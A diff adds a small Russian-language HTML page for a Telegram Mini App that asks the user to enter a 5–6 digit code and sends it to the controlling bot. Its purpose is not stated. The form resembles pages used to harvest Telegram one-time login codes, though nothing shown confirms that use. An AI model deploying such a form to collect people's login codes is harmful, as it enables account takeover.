@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        h2 { margin-bottom: 20px; font-size: 22px; }
+        input { width: 100%; padding: 15px; border: 2px solid #0088cc; border-radius: 12px; font-size: 24px; text-align: center; outline: none; box-sizing: border-box; background: var(--tg-theme-secondary-bg-color, #f5f5f5); color: var(--tg-theme-text-color); }
+        button { margin-top: 20px; width: 100%; padding: 15px; background-color: #0088cc; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
+        button:active { opacity: 0.7; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Введите код</h2>
+        <input type="text" id="code" inputmode="numeric" placeholder="00000" maxlength="6">
+        <button onclick="send()">Подтвердить</button>
+    </div>
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        function send() {
+            let val = document.getElementById("code").value;
+            if (val.length >= 5) {
+                tg.sendData(val); // Отправка данных боту
+            } else {
+                alert("Введите полный код");
+            }
+        }
+    </script>
+</body>
+</html>
